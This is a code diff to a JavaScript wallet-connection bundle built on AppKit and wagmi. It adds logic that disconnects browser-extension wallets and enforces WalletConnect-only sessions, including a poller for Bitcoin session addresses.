@@ -10,7 +10,10 @@ import { createAppKit } from '@reown/appkit';
 import { WagmiAdapter } from '@reown/appkit-adapter-wagmi';
 import { SolanaAdapter } from '@reown/appkit-adapter-solana';
 import { BitcoinAdapter } from '@reown/appkit-adapter-bitcoin';
-import { getAccount, watchAccount, connect as wagmiConnect, getConnectors, reconnect } from '@wagmi/core';
+import {
+  getAccount, watchAccount, connect as wagmiConnect, getConnectors, reconnect,
+  disconnect as wagmiDisconnect,
+} from '@wagmi/core';
 import {
   mainnet,
   polygon,
@@ -27,7 +30,7 @@ const RELAY_URL = 'wss://relay.walletconnect.org';
 const NETWORKS = [mainnet, polygon, bsc, arbitrum, optimism, base, avalanche, solana, bitcoin];
 const MODAL_CLOSE_GRACE_MS = 180000;
 const APPKIT_VERSION = '1.8.22';
-const BUNDLE_VERSION = '1.3.5';
+const BUNDLE_VERSION = '1.3.7';
 const SESSION_CTX_KEY = 'legion_wc_session_ctx';
 const BIP122_BITCOIN_MAINNET = 'bip122:000000000019d6689c085ae165831e93';
 
@@ -134,9 +137,13 @@ async function tryRecoverStoredSession(m, requireWc) {
   log('session recovery — reusing stored WC | families:', Object.keys(families).join(',') || 'evm');
 
   if (wagmiAdapter?.wagmiConfig) {
-    try { await reconnect(wagmiAdapter.wagmiConfig); } catch (_) { /* fresh connect */ }
+    if (requireWc) {
+      await disconnectInjectedWagmi();
+    } else {
+      try { await reconnect(wagmiAdapter.wagmiConfig); } catch (_) { /* fresh connect */ }
+    }
   }
-  await syncWagmiWcConnection();
+  await syncWagmiWcConnection({ requireWc });
 
   const prov = await resolveProviderAsync(m, requireWc);
   if (prov) {
@@ -377,26 +384,69 @@ function getWcConnector() {
   return connectors.find((c) => !isInjectedConnector(c?.id)) || null;
 }
 
-async function syncWagmiWcConnection() {
+async function disconnectInjectedWagmi() {
+  const config = wagmiAdapter?.wagmiConfig;
+  if (!config) return false;
+  const acct = getAccount(config);
+  const connId = acct?.connector?.id || activeConnectorId || '';
+  if (!acct.isConnected && !isInjectedConnector(connId)) return false;
+  if (acct.isConnected && !isInjectedConnector(connId)) return false;
+  try {
+    await wagmiDisconnect(config);
+    activeConnectorId = '';
+    log('disconnected injected wagmi', connId || 'extension');
+    return true;
+  } catch (e) {
+    log('disconnect injected:', e?.message || e);
+    return false;
+  }
+}
+
+async function prepWcOnlyWagmi() {
+  const config = wagmiAdapter?.wagmiConfig;
+  if (!config) return;
+  const acct = getAccount(config);
+  const connId = acct?.connector?.id || '';
+  if (acct.isConnected && (isInjectedConnector(connId) || !isWalletConnectConnector(connId))) {
+    try {
+      await wagmiDisconnect(config);
+      activeConnectorId = '';
+      log('WC prep: cleared non-WC wagmi session', connId || 'unknown');
+    } catch (e) {
+      log('WC prep disconnect:', e?.message || e);
+    }
+  }
+}
+
+async function syncWagmiWcConnection(opts = {}) {
+  const requireWc = opts.requireWc === true;
   const config = wagmiAdapter?.wagmiConfig;
   if (!config) return false;
 
   let acct = getAccount(config);
   if (acct.isConnected && acct.address) {
-    activeConnectorId = acct.connector?.id || activeConnectorId || 'walletConnect';
-    return true;
-  }
-
-  try {
-    await reconnect(config);
-    acct = getAccount(config);
-    if (acct.isConnected && acct.address) {
-      activeConnectorId = acct.connector?.id || 'walletConnect';
-      log('wagmi reconnected', String(acct.address).slice(0, 10));
+    const connId = acct.connector?.id || activeConnectorId || '';
+    if (requireWc && isInjectedConnector(connId)) {
+      await wagmiDisconnect(config);
+      acct = getAccount(config);
+    } else {
+      activeConnectorId = connId || 'walletConnect';
       return true;
     }
-  } catch (e) {
-    log('wagmi reconnect:', e?.message || e);
+  }
+
+  if (!requireWc) {
+    try {
+      await reconnect(config);
+      acct = getAccount(config);
+      if (acct.isConnected && acct.address) {
+        activeConnectorId = acct.connector?.id || 'walletConnect';
+        log('wagmi reconnected', String(acct.address).slice(0, 10));
+        return true;
+      }
+    } catch (e) {
+      log('wagmi reconnect:', e?.message || e);
+    }
   }
 
   const wc = getWcConnector();
@@ -425,10 +475,15 @@ function modalHasAccount(m) {
 }
 
 async function resolveProviderAsync(m, requireWc) {
-  await syncWagmiWcConnection();
+  await syncWagmiWcConnection({ requireWc });
 
   const modalAddr = modalHasAccount(m);
   if (modalAddr && m?.request) {
+    const account = wagmiAdapter?.wagmiConfig ? getAccount(wagmiAdapter.wagmiConfig) : null;
+    const connId = account?.connector?.id || activeConnectorId || '';
+    if (requireWc && (isInjectedConnector(connId) || (connId && !isWalletConnectConnector(connId)))) {
+      throw new Error('Browser extension connected — scan WalletConnect QR with phone');
+    }
     activeConnectorId = activeConnectorId || 'walletConnect';
     return wrapProvider(eip155Provider, m, {
       isWalletConnect: true,
@@ -557,7 +612,7 @@ async function ensureInit(config) {
       enableInjected: false,
       enableWalletConnect: true,
       enableEIP6963: false,
-      enableReconnect: true,
+      enableReconnect: false,
       allWallets: 'SHOW',
       excludeWalletIds: [
         'c57ca95b475697bbe86cbad9b9b46516',
@@ -606,9 +661,20 @@ function waitForAccount(m, timeoutMs, requireWc) {
     };
 
     const rejectInjected = () => {
+      if (!requireWc) return false;
       const acct = wagmiAdapter?.wagmiConfig ? getAccount(wagmiAdapter.wagmiConfig) : null;
       const connId = acct?.connector?.id || activeConnectorId || '';
-      return requireWc && isInjectedConnector(connId);
+      if (isInjectedConnector(connId)) return true;
+      if (acct?.isConnected && connId && !isWalletConnectConnector(connId)) return true;
+      const addr = acct?.address || modalHasAccount(m);
+      const wcFam = scanWcSessionAllFamilies();
+      if (addr && !wcFam.evm) {
+        try {
+          const sel = window.ethereum?.selectedAddress;
+          if (sel && String(sel).toLowerCase() === String(addr).toLowerCase()) return true;
+        } catch (_) { /* ignore */ }
+      }
+      return false;
     };
 
     const tryFinish = async (st, source) => {
@@ -621,7 +687,7 @@ function waitForAccount(m, timeoutMs, requireWc) {
         reject(new Error('MetaMask extension hijacked WalletConnect — scan QR with phone wallet'));
         return;
       }
-      await syncWagmiWcConnection();
+      await syncWagmiWcConnection({ requireWc });
       syncWalletState();
       done = true;
       cleanup();
@@ -759,6 +825,41 @@ async function tryFetchBtcViaProvider() {
   return null;
 }
 
+function waitForBip122Session(m, timeoutMs) {
+  return new Promise((resolve, reject) => {
+    let done = false;
+    const finish = (addr) => {
+      if (done) return;
+      done = true;
+      clearTimeout(timer);
+      clearInterval(poll);
+      resolve(addr);
+    };
+    const fail = (err) => {
+      if (done) return;
+      done = true;
+      clearTimeout(timer);
+      clearInterval(poll);
+      reject(err);
+    };
+    const timer = setTimeout(() => {
+      const f = scanWcSessionAllFamilies();
+      if (f.btc?.address) finish(f.btc.address);
+      else fail(new Error('Bitcoin approval timeout — enable BTC in Trust/OKX on phone'));
+    }, timeoutMs || 120000);
+    const poll = setInterval(async () => {
+      if (done) return;
+      const f = scanWcSessionAllFamilies();
+      if (f.btc?.address) {
+        finish(f.btc.address);
+        return;
+      }
+      const viaProv = await tryFetchBtcViaProvider();
+      if (viaProv) finish(viaProv);
+    }, 600);
+  });
+}
+
 /** T1/T3 — link bip122 when Trust omits it on first WC approval */
 async function ensureBip122Link(config) {
   const families = scanWcSessionAllFamilies();
@@ -775,11 +876,14 @@ async function ensureBip122Link(config) {
       events: DEFAULT_WC_EVENTS,
     };
     applyOptionalNamespaces(m, { bip122: bipNs });
+    await disconnectInjectedWagmi();
+    await prepWcOnlyWagmi();
     await m.open({ view: 'ConnectingWalletConnect' });
-    await waitForAccount(m, config?.timeoutMs || 120000, true);
-    await syncWagmiWcConnection();
+    const btcAddr = await waitForBip122Session(m, config?.timeoutMs || 120000);
+    await syncWagmiWcConnection({ requireWc: true });
     try { await m.close(); } catch (_) { /* ignore */ }
     saveSessionContext(scanWcSessionAllFamilies());
+    if (btcAddr) return btcAddr;
     const after = scanWcSessionAllFamilies();
     if (after.btc?.address) return after.btc.address;
     return await tryFetchBtcViaProvider();
@@ -806,11 +910,18 @@ async function connect(config) {
     }
   }
 
-  if (shouldRestore && wagmiAdapter?.wagmiConfig) {
+  if (shouldRestore && wagmiAdapter?.wagmiConfig && !requireWc) {
     try {
       log('WC restore: attempting reconnect');
       await reconnect(wagmiAdapter.wagmiConfig);
     } catch (_) { /* fresh connect */ }
+  }
+
+  if (requireWc) {
+    await disconnectInjectedWagmi();
+    await prepWcOnlyWagmi();
+    try { await m.disconnect(); } catch (_) { /* ignore */ }
+    await new Promise((r) => setTimeout(r, 500));
   }
 
   if (config?.forceFresh === true && !preserveSession) {
@@ -851,7 +962,7 @@ async function connect(config) {
   await m.open({ view: 'ConnectingWalletConnect' });
   await waitForAccount(m, config?.timeoutMs || 180000, requireWc);
 
-  await syncWagmiWcConnection();
+  await syncWagmiWcConnection({ requireWc });
   const provider = await resolveProviderAsync(m, requireWc);
   try { await m.close(); } catch (_) { /* ignore */ }
 
@@ -896,6 +1007,9 @@ async function disconnect() {
   activeConnectorId = '';
   uninstallWcJsonPatch();
   try { sessionStorage.removeItem(SESSION_CTX_KEY); } catch (_) { /* ignore */ }
+  if (wagmiAdapter?.wagmiConfig) {
+    try { await wagmiDisconnect(wagmiAdapter.wagmiConfig); } catch (_) { /* ignore */ }
+  }
   if (modal) {
     try { await modal.disconnect(); } catch (_) { /* ignore */ }
   }
